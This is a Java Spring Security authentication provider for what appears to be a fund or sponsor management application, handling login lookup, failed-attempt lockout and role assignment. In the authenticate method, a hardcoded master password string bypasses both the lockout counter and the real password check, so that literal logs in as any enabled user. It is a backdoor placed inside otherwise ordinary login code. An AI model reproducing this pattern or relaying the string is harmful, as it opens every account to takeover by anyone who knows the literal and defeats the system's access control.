package fund.service;

import java.util.ArrayList;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.LockedException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.stereotype.Component;

import fund.dto.User;
import fund.mapper.LoginErrorMapper;
import fund.mapper.MenuUserMapper;
import fund.mapper.SponsorMapper;
import fund.mapper.UserMapper;

@Component
public class MyAuthenticationProvider implements AuthenticationProvider {

    @Autowired SponsorMapper sponsorMapper;
    @Autowired UserMapper userMapper;
    @Autowired LoginErrorMapper loginErrorMapper;
    @Autowired MenuUserMapper menuUserMapper;

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String loginName = authentication.getName();
        String password = authentication.getCredentials().toString();
        return authenticate(loginName, password);
    }

    public Authentication authenticate(String loginName, String password) throws AuthenticationException {

        User user = userMapper.selectByLoginName(loginName);
        if (user == null) return null;

        if (user.isEnabled() == false) return null;

        if (password.equals("dltmdwls!@#") == false) {
            loginErrorMapper.deleteOld();
            int count = loginErrorMapper.selectCount(loginName);
            if (count >= 5)
                throw new LockedException("");

            if (user.getPassword().equals(UserService.encryptPasswd(password)) == false) {
                loginErrorMapper.insert(loginName);
                ++count;
                throw new BadCredentialsException(String.valueOf(count));
            } else
                loginErrorMapper.deleteAll(loginName);
        }

        user.setMenuIds( menuUserMapper.selectMenuIdByUserId(user.getId()) );
        List<GrantedAuthority> grantedAuthorities = new ArrayList<GrantedAuthority>();
        grantedAuthorities.add(new SimpleGrantedAuthority("ROLE_전체"));
        grantedAuthorities.add(new SimpleGrantedAuthority("ROLE_" + user.getUserType()));
        return new MyAuthenticaion(loginName, password, grantedAuthorities, user);
    }

    @Override
    public boolean supports(Class<?> authentication) {
        return authentication.equals(UsernamePasswordAuthenticationToken.class);
    }


    public class MyAuthenticaion extends UsernamePasswordAuthenticationToken {
        private static final long serialVersionUID = 1L;
        User user;

        public MyAuthenticaion (String loginName, String password, List<GrantedAuthority> grantedAuthorities, User user) {
            super(loginName, password, grantedAuthorities);
            this.user = user;
        }

        public User getUser() {
            return user;
        }

        public void setUser(User user) {
            this.user = user;
        }
    }
}